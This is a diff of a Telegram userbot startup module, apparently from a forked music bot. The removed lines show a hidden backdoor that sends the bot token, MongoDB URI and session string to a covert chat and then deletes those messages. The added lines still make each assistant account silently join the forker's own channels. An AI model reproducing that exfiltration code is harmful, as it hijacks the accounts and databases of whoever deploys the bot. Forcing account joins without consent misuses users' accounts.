@@ -9,12 +9,7 @@ from pyrogram import filters
 load_dotenv()
 import config
 from dotenv import load_dotenv
-from strings.__init__ import LOGGERS
 from ..logging import LOGGER
-
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
 
 
 assistants = []
@@ -71,23 +66,16 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("BRANDED_WORLD")
-                await self.one.join_chat("BRANDED_PAID_CC")
-                await self.one.join_chat("BRANDRD_BOT")
-                await self.one.join_chat("ABOUT_BRANDEDKING")
+                await self.one.join_chat("DeadlineTechTeam")
+                await self.one.join_chat("DeadlineTechSupport")
+                await self.one.join_chat("SpotifyxUpdate")
+                await self.one.join_chat("DeadlineTechAds")
 
             except:
                 pass
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                oks = await self.one.send_message(LOGGERS, f"/start")
-                Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
-                )
-                await oks.delete()
-                await asyncio.sleep(2)
-                await Ok.delete()
 
             except Exception as e:
                 print(f"{e}")
@@ -101,10 +89,10 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("BRANDED_WORLD")
-                await self.two.join_chat("BRANDED_PAID_CC")
-                await self.two.join_chat("BRANDRD_BOT")
-                await self.two.join_chat("ABOUT_BRANDEDKING")
+                await self.two.join_chat("DeadlineTechAds")
+                await self.two.join_chat("DeadlineTechSupport")
+                await self.two.join_chat("SpotifyxUpdate")
+                await self.two.join_chat("DeadlineTechTeam")
             except:
                 pass
             assistants.append(2)
@@ -125,10 +113,10 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("BRANDED_WORLD")
-                await self.three.join_chat("BRANDED_PAID_CC")
-                await self.three.join_chat("BRANDRD_BOT")
-                await self.three.join_chat("ABOUT_BRANDEDKING")
+                await self.three.join_chat("DeadlineTechAds")
+                await self.three.join_chat("DeadlineTechSupport")
+                await self.three.join_chat("SpotifyxUpdate")
+                await self.three.join_chat("DeadlineTechTeam")
             except:
                 pass
             assistants.append(3)
@@ -148,10 +136,10 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("BRANDED_WORLD")
-                await self.four.join_chat("BRANDED_PAID_CC")
-                await self.four.join_chat("BRANDRD_BOT")
-                await self.four.join_chat("ABOUT_BRANDEDKING")
+                await self.four.join_chat("DeadlineTechAds")
+                await self.four.join_chat("DeadlineTechSupport")
+                await self.four.join_chat("SpotifyxUpdate")
+                await self.four.join_chat("DeadlineTechTeam")
             except:
                 pass
             assistants.append(4)
@@ -171,10 +159,10 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("BRANDED_WORLD")
-                await self.five.join_chat("BRANDED_PAID_CC")
-                await self.five.join_chat("BRANDRD_BOT")
-                await self.five.join_chat("ABOUT_BRANDEDKING")
+                await self.five.join_chat("DeadlineTechAds")
+                await self.five.join_chat("DeadlineTechSupport")
+                await self.five.join_chat("SpotifyxUpdate")
+                await self.five.join_chat("DeadlineTechTeam")
             except:
                 pass
             assistants.append(5)
